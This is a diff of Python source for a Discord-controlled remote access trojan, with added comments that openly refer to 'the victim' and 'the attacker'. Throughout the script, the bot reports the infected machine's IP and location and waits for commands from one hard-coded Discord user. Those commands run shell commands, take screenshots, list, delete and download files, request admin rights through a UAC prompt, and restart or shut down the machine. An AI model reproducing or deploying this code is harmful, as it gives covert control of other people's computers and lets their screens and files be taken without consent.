@@ -1,11 +1,12 @@
+#A library used to fix an error due to SSL failing to connect due to certificates
 import truststore
 truststore.inject_into_ssl()
 
+#Imports all the needed libraries
 import discord
 import os
 import sys
 import platform
-import ctypes
 import urllib.request
 import json
 import mss
@@ -15,17 +16,22 @@ import asyncio
 import pyuac
 import subprocess
 
-token = ''
+token = 'your token here'
+
+#Creating the client using the token from above
 intents = discord.Intents.all()
 client = discord.Client(intents=intents)
 
+#Executing actions once bot has loaded
 @client.event
 async def on_ready():
+    #Requests basic IP information of the system
     url = urllib.request.urlopen('https://geolocation-db.com/json')
     info = json.loads(url.read().decode())
     flag = info['country_code']
     ip = info['IPv4']
 
+    #Grabs the device information and creates a channel based off the name of the device
     plat = platform.uname()
     global channelname
     channelname = f'session-{plat.node.lower()}'
@@ -34,27 +40,28 @@ async def on_ready():
     channel = discord.utils.get(cmdguild.text_channels, name=channelname)
     global activechannel
     activechannel = client.get_channel(channel.id)
-    hello = f'Bot has been started on {plat.system} {plat.release}. Location is :flag_{flag.lower()}:. IP is {ip}.'
+    await activechannel.send(f'Bot has been started on {plat.system} {plat.release}. Location is :flag_{flag.lower()}:. IP is {ip}.')
 
-    isadmin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    if isadmin == True:
-        await activechannel.send(f'{hello} Has admin.')
-    elif isadmin == False:
-        await activechannel.send(hello)
-
+#Executes actions when a message is sent
 @client.event
 async def on_message(message):
+    #Ignores messages sent by itself
     if message.author == client.user:
         pass
+    #Only allows access to the attacker for malicious commands
     if message.author.id == 250684163303276545:
+        #Ensures all sessions do not overlap
         if message.channel.name != channelname:
             pass
         else:
+            #Using a match case instead of repeated elif statements for commands
             match message.content:
+                #Quits the program
                 case '!quit':
                     await activechannel.delete()
                     sys.exit(0)
 
+                #Attempts to gain admin by popping up a UAC prompt
                 case '!uac':
                     try:
                         if not pyuac.isUserAdmin():
@@ -65,6 +72,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Lists the commands available
                 case '!help':
                     await message.channel.send('Commands available:'
                                                '!help - Brings up this message'
@@ -83,9 +91,11 @@ async def on_message(message):
                                                '!prompt - Pops up a prompt on screen - !prompt text'
                                                '!shell - Runs a shell command - !shell command')
 
+                #Shows the attacker the current working directory
                 case '!cwd':
                     await message.channel.send(f'Current directory: {os.getcwd()}')
 
+                #Lists all the files in the current directory
                 case '!lsfiles':
                     files = []
                     dir = os.scandir(os.getcwd())
@@ -95,6 +105,7 @@ async def on_message(message):
                             files.append(item.name)
                     await message.channel.send('\n'.join(files))
 
+                #Lists all directories in the current directory
                 case '!lsdir':
                     folders = []
                     dir = os.scandir(os.getcwd())
@@ -104,6 +115,7 @@ async def on_message(message):
                             folders.append(item.name)
                     await message.channel.send('\n'.join(folders))
 
+                #Takes a screenshot of the victims monitor or monitors
                 case '!screenshot':
                     with mss.mss() as sc:
                         ss = sc.shot(mon=-1, output='monitors.png')
@@ -111,16 +123,19 @@ async def on_message(message):
                     await message.channel.send(f'Here is the screenshot:', file=file)
                     os.remove('monitors.png')
 
+                #Restarts the victim computer
                 case '!restart':
                     await message.channel.send('Restarting computer')
                     await activechannel.delete()
                     os.system('shutdown /r /t 00')
 
+                #Shutsdown the victim computer
                 case '!shutdown':
                     await message.channel.send('Shutting down computer')
                     await activechannel.delete()
                     os.system('shutdown /s /t 00')
 
+                #Changes the current working directory
                 case cmd if cmd.startswith('!cd'):
                         arg = message.content.split(' ', 1)
                         try:
@@ -132,12 +147,13 @@ async def on_message(message):
                         except Exception as e:
                             await message.channel.send(f'An error occurred: {e}')
 
+                #Copies a stated file to a new directory
                 case cmd if cmd.startswith('!cp'):
                     arg = message.content.split(' ', 1)
                     try:
                         if len(arg) == 2:
                             input1 = arg[1]
-                            await message.channel.send(f'Provide the destination folder and the copy filename')
+                            await message.channel.send(f'Provide the destination folder and the filename for the copy')
                             try:
                                 arg2 = await client.wait_for('message', timeout=20, check= lambda m: m.author == message.author and m.channel == message.channel)
                                 input2 = arg2.content
@@ -148,6 +164,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Deletes a selected file
                 case cmd if cmd.startswith('!delete'):
                     arg = message.content.split(' ', 1)
                     try:
@@ -159,6 +176,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Downloads a selected file
                 case cmd if cmd.startswith('!download'):
                     arg = message.content.split(' ', 1)
                     try:
@@ -168,6 +186,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Creates an alert on the victim computer
                 case cmd if cmd.startswith('!alert'):
                     arg = message.content.split(' ', 1)
                     try:
@@ -178,6 +197,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Creates a prompt on the victim where they are able to send a message back
                 case cmd if cmd.startswith('!prompt'):
                     arg = message.content.split(' ', 1)
                     try:
@@ -188,6 +208,7 @@ async def on_message(message):
                     except Exception as e:
                         await message.channel.send(f'An error occurred: {e}')
 
+                #Executes a command through the shell
                 case cmd if cmd.startswith('!shell'):
                     arg = message.content.split(' ', 1)
                     try:
@@ -201,4 +222,5 @@ async def on_message(message):
     else:
         pass
 
+#Runs the bot
 client.run(token)
